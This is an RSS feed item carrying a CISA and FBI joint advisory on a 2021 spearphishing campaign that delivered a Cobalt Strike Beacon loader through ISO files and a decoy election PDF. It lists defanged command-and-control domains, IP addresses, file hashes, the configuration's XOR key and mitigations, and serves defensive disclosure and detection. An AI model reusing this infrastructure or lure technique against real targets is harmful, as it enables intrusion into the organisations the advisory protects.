<?xml version="1.0" encoding="utf-8"?>
<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:foaf="http://xmlns.com/foaf/0.1/" xmlns:og="http://ogp.me/ns#" xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#" xmlns:schema="http://schema.org/" xmlns:sioc="http://rdfs.org/sioc/ns#" xmlns:sioct="http://rdfs.org/sioc/types#" xmlns:skos="http://www.w3.org/2004/02/skos/core#" xmlns:xsd="http://www.w3.org/2001/XMLSchema#" version="2.0" xml:base="https://us-cert.cisa.gov/">
  <channel>
    <title> CISA Alerts</title>
    <link>https://us-cert.cisa.gov/</link>
    <description>Alerts warn about vulnerabilities, incidents, and other security issues that pose a significant risk.</description>
    <language>en</language>
    
    <item>
	<title>AA21-148A: Sophisticated Spearphishing Campaign Targets Government Organizations, IGOs, and NGOs</title>
	<link>https://us-cert.cisa.gov/ncas/alerts/aa21-148a</link>
	<description>Original release date: May 28, 2021 | Last revised: May 29, 2021&lt;br/&gt;&lt;h3&gt;Summary&lt;/h3&gt;&lt;p class="tip-intro" style="font-size: 15px;"&gt;&lt;em&gt;This Joint Cybersecurity Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&amp;amp;CK®) framework, Version 9. See the &lt;a href="https://attack.mitre.org/versions/v9/techniques/enterprise/"&gt;ATT&amp;amp;CK for Enterprise&lt;/a&gt; for all referenced threat actor tactics and techniques.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI) are engaged in addressing a spearphishing campaign targeting government organizations, intergovernmental organizations (IGOs), and non-governmental organizations (NGOs). A sophisticated cyber threat actor leveraged a compromised end-user account from Constant Contact, a legitimate email marketing software company, to spoof a U.S.-based government organization and distribute links to malicious URLs.[&lt;a href="https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/"&gt;1&lt;/a&gt;] CISA and FBI have not determined that any individual accounts have been specifically targeted by this campaign.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note: &lt;/strong&gt;CISA and FBI acknowledge open-source reporting attributing the activity discussed in the report to APT29 (also known as Nobelium, The Dukes, and Cozy Bear).[&lt;a href="https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/"&gt;2&lt;/a&gt;,&lt;a href="https://www.volexity.com/blog/2021/05/27/suspected-apt29-operation-launches-election-fraud-themed-phishing-campaigns/"&gt;3&lt;/a&gt;] However, CISA and FBI are investigating this activity and have not attributed it to any threat actor at this time. CISA and FBI will update this Joint Cybersecurity Advisory as new information becomes available. Note:&lt;/p&gt;

&lt;p&gt;This Joint Cybersecurity Advisory contains information on tactics, techniques, and procedures (TTPs) and malware associated with this campaign. For more information on the malware, refer to Malware Analysis Report &lt;a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar21-148a"&gt;MAR-10339794-1.v1: Cobalt Strike Beacon&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;CISA and FBI urge governmental and international affairs organizations and individuals associated with such organizations to adopt a heightened state of awareness and implement the recommendations in the Mitigations section of this advisory.&lt;/p&gt;

&lt;p&gt;For a downloadable list of indicators of compromise (IOCs), refer to &lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/AA21-148A.stix.xml"&gt;AA21-148A.stix&lt;/a&gt;, and &lt;a href="https://us-cert.cisa.gov/sites/default/files/2021-05/IB-21-10094.stix.xml"&gt;MAR-10339794-1.v1.stix&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/AA21-148A-Sophisticated-Spearphishing_Campaign.pdf"&gt;Click here&lt;/a&gt; for a PDF version of this report.&lt;/p&gt;
&lt;h3&gt;Technical Details&lt;/h3&gt;&lt;p&gt;Based on incident reports, malware collection, and trusted third-party reporting, CISA and FBI are engaged in addressing a sophisticated spearphishing campaign. A cyber threat actor leveraged a compromised end-user account from Constant Contact, a legitimate email marketing software company, to send phishing emails to more than 7,000 accounts across approximately 350 government organizations, IGOs, and NGOs. The threat actor sent spoofed emails that appeared to originate from a U.S. Government organization. The emails contained a legitimate Constant Contact link that redirected to a malicious URL [&lt;a href="https://attack.mitre.org/versions/v9/techniques/T1566/002/"&gt;T1566.002&lt;/a&gt;, &lt;a href="https://attack.mitre.org/versions/v9/techniques/T1204/001/"&gt;T1204.001&lt;/a&gt;], from which a malicious ISO file was dropped onto the victim’s machine.&lt;/p&gt;

&lt;p&gt;The ISO file contained (1) a malicious Dynamic Link Library (DLL) named Documents.dll [&lt;a href="https://attack.mitre.org/versions/v9/techniques/T1055/001/"&gt;T1055.001&lt;/a&gt;], which is a custom Cobalt Strike Beacon version 4 implant, (2) a malicious shortcut file that executes the Cobalt Strike Beacon loader [&lt;a href="https://attack.mitre.org/versions/v9/techniques/T1105/"&gt;T1105&lt;/a&gt;], and (3) a benign decoy PDF titled “Foreign Threats to the 2020 US Federal Elections” with file name “ICA-declass.pdf” (see figure 1). Note: The decoy file appears to be a copy of the declassified Intelligence Community Assessment pursuant to Executive Order 13848 Section 1(a), which is available at &lt;a href="https://www.intelligence.gov/index.php/ic-on-the-record-database/results/1046-foreign-threats-to-the-2020-us-federal-elections-intelligence-community-assessment"&gt;https://www.intelligence.gov/index.php/ic-on-the-record-database/results/1046-foreign-threats-to-the-2020-us-federal-elections-intelligence-community-assessment&lt;/a&gt;.&lt;/p&gt;

&lt;p class="text-align-center"&gt;&lt;img alt="" data-entity-type="file" data-entity-uuid="7443ecfd-6f40-4ebc-8401-be3ce43b34f9" height="747" src="https://us-cert.cisa.gov/sites/default/files/publications/aa21-062a.png" width="618" /&gt;&lt;/p&gt;

&lt;p class="text-align-center"&gt;Figure 1: Decoy PDF: ICA-declass.pdf&lt;/p&gt;

&lt;p&gt;&lt;a href="https://attack.mitre.org/software/S0154/"&gt;Cobalt Strike&lt;/a&gt; is a commercial penetration testing tool used to conduct red team operations.[&lt;a href="https://attack.mitre.org/software/S0154/"&gt;4&lt;/a&gt;] It contains a number of tools that complement the cyber threat actor’s exploitation efforts, such as a keystroke logger, file injection capability, and network services scanners. The Cobalt Strike Beacon is the malicious implant that calls back to attacker-controlled infrastructure and checks for additional commands to execute on the compromised system [&lt;a href="https://attack.mitre.org/versions/v9/tactics/TA0011/"&gt;TA0011&lt;/a&gt;].&lt;/p&gt;

&lt;p&gt;The configuration file for this Cobalt Strike Beacon implant contained communications protocols, an implant watermark, and the following hardcoded command and control (C2) domains:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;dataplane.theyardservice[.]com/jquery-3.3.1.min.woff2&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;cdn.theyardservice[.]com/jquery-3.3.1.min.woff2&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;static.theyardservice[.]com/jquery-3.3.1.min.woff2&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;worldhomeoutlet[.]com/jquery-3.3.1.min.woff2&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The configuration file was encoded via an XOR with the key &lt;code&gt;0x2e&lt;/code&gt; and a 16-bit byte swap.&lt;/p&gt;

&lt;p&gt;For more information on the ISO file and Cobalt Strike Beacon implant, including IOCs, refer to Malware Analysis Report &lt;a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar21-148a"&gt;MAR-10339794-1.v1: Cobalt Strike Beacon&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;Indicators of Compromise&lt;/h2&gt;

&lt;p&gt;The following IOCS were derived from trusted third parties and open-source research. For a downloadable list of IOCs, refer to &lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/AA21-148A.stix.xml"&gt;AA21-148A.stix&lt;/a&gt; and &lt;a href="https://us-cert.cisa.gov/sites/default/files/2021-05/IB-21-10094.stix.xml"&gt;MAR-10339794-1.v1.stix&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;strong&gt;URL: &lt;/strong&gt;&lt;code&gt;https[:]//r20.rs6.net/tn.jsp?f=&lt;/code&gt;&lt;br /&gt;
	&lt;strong&gt;Host IP: &lt;/strong&gt;&lt;code&gt;208.75.122[.]11 (US)&lt;/code&gt;&lt;br /&gt;
	&lt;strong&gt;Owner: &lt;/strong&gt;Constant Contact, Inc.&lt;br /&gt;
	&lt;strong&gt;Activity: &lt;/strong&gt;legitimate Constant Contact link found in phishing email that redirects victims to actor-controlled infrastructure at &lt;code&gt;https[:]//usaid.theyardservice.com/d/&amp;lt;target_email_address&amp;gt;&lt;/code&gt;&lt;br /&gt;
	&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;URL: &lt;/strong&gt;&lt;code&gt;https[:]//usaid.theyardservice.com/d/&amp;lt;target_email_address&amp;gt;&lt;/code&gt;&lt;br /&gt;
	&lt;strong&gt;Host IP:&lt;/strong&gt; &lt;code&gt;83.171.237[.]173&lt;/code&gt; (Germany)&lt;br /&gt;
	&lt;strong&gt;Owner: &lt;/strong&gt;[redacted]&lt;br /&gt;
	&lt;strong&gt;First Seen:&lt;/strong&gt; May 25, 2021&lt;br /&gt;
	&lt;strong&gt;Activity:&lt;/strong&gt; actor-controlled URL that was redirected from&lt;code&gt; https[:]//r20.rs6.net/tn.jsp?f=&lt;/code&gt;; the domain &lt;code&gt;usaid[.]theyardservice.com&lt;/code&gt; was detected as a malware site; hosted a malicious ISO file "&lt;code&gt;usaid[.]theyardservice.com&lt;/code&gt;"&lt;br /&gt;
	&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;File:&lt;/strong&gt; &lt;code&gt;ICA-declass.iso &lt;/code&gt;[MD5: &lt;code&gt;cbc1dc536cd6f4fb9648e229e5d23361&lt;/code&gt;]&lt;br /&gt;
	&lt;strong&gt;File Type: &lt;/strong&gt;Macintosh Disk Image&lt;br /&gt;
	&lt;strong&gt;Detection: &lt;/strong&gt;&lt;code&gt;Artemis!7EDF943ED251&lt;/code&gt;, Trojan:&lt;code&gt;Win32/Cobaltstrike!MSR&lt;/code&gt;, or other malware&lt;br /&gt;
	&lt;strong&gt;Activity:&lt;/strong&gt; ISO file container; contains a custom Cobalt Strike Beacon loader; communicated with multiple URLs, domains, and IP addresses&lt;br /&gt;
	&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;File: &lt;/strong&gt;&lt;code&gt;/d/&lt;/code&gt; [&lt;code&gt;MD5: ebe2f8df39b4a94fb408580a728d351f&lt;/code&gt;]&lt;br /&gt;
	&lt;strong&gt;File Type: &lt;/strong&gt;Macintosh Disk Image&lt;br /&gt;
	&lt;strong&gt;Detection: &lt;/strong&gt;Cobalt, Artemis!7EDF943ED251, or other malware&lt;br /&gt;
	&lt;strong&gt;Activity:&lt;/strong&gt; ISO file container; contains a custom Cobalt Strike Beacon loader; communicated with multiple URLs, domains, and IP addresses&lt;br /&gt;
	&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;File:&lt;/strong&gt; ICA-declass.iso [MD5: 29e2ef8ef5c6ff95e98bff095e63dc05]&lt;br /&gt;
	&lt;strong&gt;File Type:&lt;/strong&gt; Macintosh Disk Image&lt;br /&gt;
	&lt;strong&gt;Detection:&lt;/strong&gt; Cobalt Strike, Rozena, or other malware&lt;br /&gt;
	&lt;strong&gt;Activity:&lt;/strong&gt; ISO file container; contains a custom Cobalt Strike Beacon loader; communicated with multiple URLs, domains, and IP addresses&lt;br /&gt;
	&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;File:&lt;/strong&gt; &lt;code&gt;Reports.lnk&lt;/code&gt; [MD5: &lt;code&gt;dcfd60883c73c3d92fceb6ac910d5b80&lt;/code&gt;]&lt;br /&gt;
	&lt;strong&gt;File Type: &lt;/strong&gt;LNK (Windows shortcut)&lt;br /&gt;
	&lt;strong&gt;Detection:&lt;/strong&gt; Worm: &lt;code&gt;Win32-Script.Save.df8efe7a&lt;/code&gt;, Static AI - Suspicious LNK, or other malware&lt;br /&gt;
	&lt;strong&gt;Activity: &lt;/strong&gt;shortcut contained in malicious ISO files; executes a custom Cobalt Strike Beacon loader&lt;br /&gt;
	&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;File:&lt;/strong&gt; &lt;code&gt;ICA-declass.pdf&lt;/code&gt; [MD5: &lt;code&gt;b40b30329489d342b2aa5ef8309ad388&lt;/code&gt;]&lt;br /&gt;
	&lt;strong&gt;File Type:&lt;/strong&gt; PDF&lt;br /&gt;
	&lt;strong&gt;Detection:&lt;/strong&gt; undetected&lt;br /&gt;
	&lt;strong&gt;Activity:&lt;/strong&gt; benign, password-protected PDF displayed to victim as a decoy; currently unrecognized by antivirus software&lt;br /&gt;
	&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;File: &lt;/strong&gt;&lt;code&gt;DOCUMENT.DLL&lt;/code&gt; [MD5: &lt;code&gt;7edf943ed251fa480c5ca5abb2446c75&lt;/code&gt;]&lt;br /&gt;
	&lt;strong&gt;File Type: &lt;/strong&gt;Win32 DLL&lt;br /&gt;
	&lt;strong&gt;Detection: &lt;/strong&gt;Trojan: &lt;code&gt;Win32/Cobaltstrike!MSR&lt;/code&gt;, Rozena, or other malware&lt;br /&gt;
	&lt;strong&gt;Activity:&lt;/strong&gt; custom Cobalt Strike Beacon loader contained in malicious ISO files; communicating with multiple URLs, domains, and IP addresses by antivirus software&lt;br /&gt;
	&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;File:&lt;/strong&gt; &lt;code&gt;DOCUMENT.DLL&lt;/code&gt; [MD5: &lt;code&gt;1c3b8ae594cb4ce24c2680b47cebf808&lt;/code&gt;]&lt;br /&gt;
	&lt;strong&gt;File Type:&lt;/strong&gt; Win32 DLL&lt;br /&gt;
	&lt;strong&gt;Detection:&lt;/strong&gt; Cobalt Strike, Razy, Khalesi, or other malware&lt;br /&gt;
	&lt;strong&gt;Activity:&lt;/strong&gt; Custom Cobalt Strike Beacon loader contained in malicious ISO files; communicating with multiple URLs, domains, and IP addresses by antivirus software&lt;br /&gt;
	&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Domain: &lt;/strong&gt;&lt;code&gt;usaid[.]theyardservice.com&lt;/code&gt;&lt;br /&gt;
	&lt;strong&gt;Host IP:&lt;/strong&gt; &lt;code&gt;83.171.237[.]173&lt;/code&gt; (Germany)&lt;br /&gt;
	&lt;strong&gt;First Seen: &lt;/strong&gt;May 25, 2021&lt;br /&gt;
	&lt;strong&gt;Owner:&lt;/strong&gt; Withheld for Privacy Purposes&lt;br /&gt;
	&lt;strong&gt;Activity:&lt;/strong&gt; subdomain used to distribute ISO file according to the trusted third party; detected as a malware site by antivirus programs&lt;br /&gt;
	&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Domain:&lt;/strong&gt; worldhomeoutlet.com&lt;br /&gt;
	&lt;strong&gt;Host IP: &lt;/strong&gt;&lt;code&gt;192.99.221[.]77&lt;/code&gt; (Canada)&lt;br /&gt;
	&lt;strong&gt;Created Date: &lt;/strong&gt;March 11, 2020&lt;br /&gt;
	&lt;strong&gt;Owner: &lt;/strong&gt;Withheld for Privacy Purposes by Registrar&lt;br /&gt;
	&lt;strong&gt;Activity:&lt;/strong&gt; Cobalt Strike C2 subdomain according to the trusted third party; categorized as suspicious and observed communicating with multiple malicious files according to antivirus software; associated with Cobalt Strike malware&lt;br /&gt;
	&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Domain:&lt;/strong&gt; &lt;code&gt;dataplane.theyardservice[.]com&lt;/code&gt;&lt;br /&gt;
	&lt;strong&gt;Host IP:&lt;/strong&gt; &lt;code&gt;83.171.237[.]173&lt;/code&gt; (Germany)&lt;br /&gt;
	&lt;strong&gt;First Seen: &lt;/strong&gt;May 25, 2021&lt;br /&gt;
	&lt;strong&gt;Owner: &lt;/strong&gt;[redacted]&lt;br /&gt;
	&lt;strong&gt;Activity:&lt;/strong&gt; Cobalt Strike C2 subdomain according to the trusted third party; categorized as suspicious and observed communicating with multiple malicious files according to antivirus software; observed in phishing, malware, and spam activity&lt;br /&gt;
	&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Domain:&lt;/strong&gt; &lt;code&gt;cdn.theyardservice[.]com&lt;/code&gt;&lt;br /&gt;
	&lt;strong&gt;Host IP:&lt;/strong&gt; &lt;code&gt;83.171.237[.]173&lt;/code&gt; (Germany)&lt;br /&gt;
	&lt;strong&gt;First Seen: &lt;/strong&gt;May 25, 2021&lt;br /&gt;
	&lt;strong&gt;Owner:&lt;/strong&gt; Withheld for Privacy Purposes by Registrar&lt;br /&gt;
	&lt;strong&gt;Activity: &lt;/strong&gt;Cobalt Strike C2 subdomain according to the trusted third party; categorized as suspicious and observed communicating with multiple malicious files according to antivirus software&lt;br /&gt;
	&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Domain:&lt;/strong&gt; static.theyardservice[.]com&lt;br /&gt;
	&lt;strong&gt;Host IP:&lt;/strong&gt; 83.171.237[.]173 (Germany)&lt;br /&gt;
	&lt;strong&gt;First Seen:&lt;/strong&gt; May 25, 2021&lt;br /&gt;
	&lt;strong&gt;Owner:&lt;/strong&gt; Withheld for Privacy Purposes&lt;br /&gt;
	&lt;strong&gt;Activity: &lt;/strong&gt;Cobalt Strike C2 subdomain according to the trusted third party; categorized as suspicious and observed communicating with multiple malicious files according to antivirus software&lt;br /&gt;
	&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;IP:&lt;/strong&gt; &lt;code&gt;192.99.221[.]77&lt;/code&gt;&lt;br /&gt;
	&lt;strong&gt;Organization: &lt;/strong&gt;OVH SAS&lt;br /&gt;
	&lt;strong&gt;Resolutions:&lt;/strong&gt; 7&lt;br /&gt;
	&lt;strong&gt;Geolocation:&lt;/strong&gt; Canada&lt;br /&gt;
	&lt;strong&gt;Activity:&lt;/strong&gt; detected as a malware site; hosts a suspicious domain &lt;code&gt;worldhomeoutlet[.]com&lt;/code&gt;; observed in Cobalt Strike activity&lt;br /&gt;
	&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;IP: &lt;/strong&gt;&lt;code&gt;83.171.237[.]173&lt;/code&gt;&lt;br /&gt;
	&lt;strong&gt;Organization:&lt;/strong&gt; Droptop GmbH&lt;br /&gt;
	&lt;strong&gt;Resolutions:&lt;/strong&gt; 15&lt;br /&gt;
	&lt;strong&gt;Geolocation: &lt;/strong&gt;Germany&lt;br /&gt;
	&lt;strong&gt;Activity:&lt;/strong&gt; Categorized as malicious by antivirus software; hosted multiple suspicious domains and multiple malicious files were observed downloaded from this IP address; observed in Cobalt Strike and activity&lt;br /&gt;
	&amp;nbsp;&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Domain:&lt;/strong&gt; &lt;code&gt;theyardservice[.]com&lt;/code&gt;&lt;br /&gt;
	&lt;strong&gt;Host IP:&lt;/strong&gt; &lt;code&gt;83.171.237[.]173&lt;/code&gt; (Germany)&lt;br /&gt;
	&lt;strong&gt;Created Date: &lt;/strong&gt;January 27, 2010&lt;br /&gt;
	&lt;strong&gt;Owner: &lt;/strong&gt;Withheld for Privacy Purposes&lt;br /&gt;
	&lt;strong&gt;Activity: &lt;/strong&gt;Threat actor controlled domain according to the trusted third party; categorized as suspicious by antivirus software; observed in Cobalt Strike activity&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Table 1 provides a summary of the MITRE ATT&amp;amp;CK techniques observed.&lt;/p&gt;

&lt;p class="italic text-align-center"&gt;&lt;em&gt;Table 1: MITRE ATT&amp;amp;CK techniques observed&lt;/em&gt;&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" height="294" style="margin-left: auto; margin-right: auto;" width="722"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col" style="width: 248px;"&gt;
			&lt;p&gt;Technique Title&lt;/p&gt;
			&lt;/th&gt;
			&lt;th scope="col" style="width: 292px;"&gt;Technique ID&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left; width: 248px;"&gt;
			&lt;p&gt;Process Injection: Dynamic-link Library Injection&lt;/p&gt;
			&lt;/td&gt;
			&lt;td scope="col" style="text-align: left; width: 292px;"&gt;
			&lt;p&gt;&lt;span style="font-size:11.0pt"&gt;&lt;span style="line-height:115%"&gt;&lt;span style="font-family:&amp;quot;Arial&amp;quot;,sans-serif"&gt;&lt;a href="https://attack.mitre.org/versions/v9/techniques/T1055/001/"&gt;T1055.001&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left; width: 248px;"&gt;
			&lt;p&gt;&lt;em&gt;Ingress Tool Transfer&lt;/em&gt;&lt;/p&gt;
			&lt;/td&gt;
			&lt;td scope="col" style="text-align: left; width: 292px;"&gt;
			&lt;p&gt;&lt;span style="font-size:11.0pt"&gt;&lt;span style="line-height:115%"&gt;&lt;span style="font-family:&amp;quot;Arial&amp;quot;,sans-serif"&gt;&lt;a href="https://attack.mitre.org/versions/v9/techniques/T1105/" style="color:#0563c1; text-decoration:underline"&gt;T1105&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left; width: 248px;"&gt;
			&lt;p&gt;User Execution: Malicious Link&lt;/p&gt;
			&lt;/td&gt;
			&lt;td scope="col" style="text-align: left; width: 292px;"&gt;
			&lt;p&gt;&lt;span style="font-size:11.0pt"&gt;&lt;span style="line-height:115%"&gt;&lt;span style="font-family:&amp;quot;Arial&amp;quot;,sans-serif"&gt;&lt;a href="https://attack.mitre.org/versions/v9/techniques/T1204/001/" style="color:#0563c1; text-decoration:underline"&gt;T1204.001&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left; width: 248px;"&gt;
			&lt;p&gt;&lt;em&gt;Phishing: Spearphishing Link&lt;/em&gt;&lt;/p&gt;
			&lt;/td&gt;
			&lt;td scope="col" style="text-align: left; width: 292px;"&gt;
			&lt;p&gt;&lt;span style="font-size:11.0pt"&gt;&lt;span style="line-height:115%"&gt;&lt;span style="font-family:&amp;quot;Arial&amp;quot;,sans-serif"&gt;&lt;a href="https://attack.mitre.org/versions/v9/techniques/T1566/002/" style="color:#0563c1; text-decoration:underline"&gt;T1566.002&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;Mitigations&lt;/h3&gt;&lt;p&gt;CISA and FBI urge CI owners and operators to apply the following mitigations.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Implement multi-factor authentication (MFA) for every account. While privileged accounts and remote access systems are critical, it is also important to ensure full coverage across SaaS solutions. Enabling MFA for corporate communications platforms (as with all other accounts) provides vital defense against these types of attacks and, in many cases, can prevent them.&lt;/li&gt;
	&lt;li&gt;Keep all software up to date. The most effective cybersecurity programs quickly update all of their software as soon as patches are available. If your organization is unable to update all software shortly after a patch is released, prioritize implementing patches for CVEs that are already known to be exploited.&lt;/li&gt;
	&lt;li&gt;Implement endpoint and detection response (EDR) tools. EDR allows a high degree of visibility into the security status of endpoints and is can be an effective tool against threat actors.&lt;br /&gt;
	&lt;strong&gt;Note: &lt;/strong&gt;Organizations using Microsoft Defender for Endpoint or Microsoft 365 Defense should refer to Microsoft: Use attack surface reduction rules to prevent malware infection for more information on hardening the enterprise attack surface.&lt;/li&gt;
	&lt;li&gt;Implement centralized log management for host monitoring. A centralized logging application allows technicians to look out for anomalous activity in the network environment, such as new applications running on hosts, out-of-place communication between devices, or unaccountable login failures on machines. It also aids in troubleshooting applications or equipment in the event of a fault. CISA and the FBI recommend that organizations:
	&lt;ul&gt;
		&lt;li&gt;Forward logs from local hosts to a centralized log management server—often referred to as a security information and event management (SIEM) tool.&lt;/li&gt;
		&lt;li&gt;Ensure logs are searchable. The ability to search, analyze, and visualize communications will help analysts diagnose issues and may lead to detection of anomalous activity.&lt;/li&gt;
		&lt;li&gt;Correlate logs from both network and host security devices. By reviewing logs from multiple sources, an organization can better triage an individual event and determine its impact to the organization as a whole.&lt;/li&gt;
		&lt;li&gt;Review both centralized and local log management policies to maximize efficiency and retain historical data. Organizations should retain critical logs for a minimum of 30 days.&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;Deploy signatures to detect and/or block inbound connection from Cobalt Strike servers and other post-exploitation tools.&lt;/li&gt;
	&lt;li&gt;Implement unauthorized execution prevention by disabling macro scripts from Microsoft Office files transmitted via email. Consider using Office Viewer software to open Microsoft Office files transmitted via email instead of full Microsoft Office suite applications.&lt;/li&gt;
	&lt;li&gt;Configure and maintain user and administrative accounts using a strong account management policy.
	&lt;ul&gt;
		&lt;li&gt;Use administrative accounts on dedicated administration workstations.&lt;/li&gt;
		&lt;li&gt;Limit access to and use of administrative accounts.&lt;/li&gt;
		&lt;li&gt;Use strong passwords. For more information on strong passwords, refer to CISA Tip: Choosing and Protecting Passwords and National Institute of Standards (NIST) SP 800-63: Digital Identity Guidelines: Authentication and Lifecycle Management.&lt;/li&gt;
		&lt;li&gt;Remove default accounts if unneeded. Change the password of default accounts that are needed.&lt;/li&gt;
		&lt;li&gt;Disable all unused accounts.&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;Implement a user training program and simulated attacks for spearphishing to discourage users from visiting malicious websites or opening malicious attachments and re-enforce the appropriate user responses to spearphishing emails.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;RESOURCES&lt;/h2&gt;

&lt;ul&gt;
	&lt;li&gt;Volexity Blog: &lt;a href="https://www.volexity.com/blog/2021/05/27/suspected-apt29-operation-launches-election-fraud-themed-phishing-campaigns/"&gt;Suspected APT29 Operation Launches Election Fraud Themed Phishing Campaigns | Volexity&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;Microsoft Blog: &lt;a href="https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/"&gt;New sophisticated email-based attack from NOBELIUM - Microsoft Security&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;Microsoft Blog: &lt;a href="https://blogs.microsoft.com/on-the-issues/2021/05/27/nobelium-cyberattack-nativezone-solarwinds/"&gt;Another Nobelium Cyberattack&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Contact Information&lt;/h3&gt;&lt;p&gt;To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at &lt;a href="http://www.fbi.gov/contact-us/field"&gt;www.fbi.gov/contact-us/field&lt;/a&gt;, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at &lt;a href="https://us-cert.cisa.govmailto:CyWatch@fbi.gov"&gt;CyWatch@fbi.gov&lt;/a&gt;. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at &lt;a href="https://us-cert.cisa.govmailto:CISAServiceDesk@cisa.dhs.gov"&gt;CISAServiceDesk@cisa.dhs.gov&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol, see &lt;a href="http://www.us-cert.gov/tlp/"&gt;http://www.us-cert.gov/tlp/&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
                    &lt;h3&gt;References&lt;/h3&gt;
		        &lt;ul&gt;		            	&lt;li&gt;&lt;a href="https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/"&gt;[1] Microsoft Blog: New Sophisticated Email-Based Attack from NOBELIUM&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/"&gt;[2] Ibid.&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.volexity.com/blog/2021/05/27/suspected-apt29-operation-launches-election-fraud-themed-phishing-campaigns/"&gt;Volexity Blog: Suspected APT29 Operation Launches Election Fraud Themed Phishing Campaigns&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://attack.mitre.org/software/S0154/"&gt;[4] MITRE ATT&amp;CK: Cobalt Strike&lt;/a&gt;&lt;/li&gt;		        &lt;/ul&gt;            &lt;h3&gt;Revisions&lt;/h3&gt;
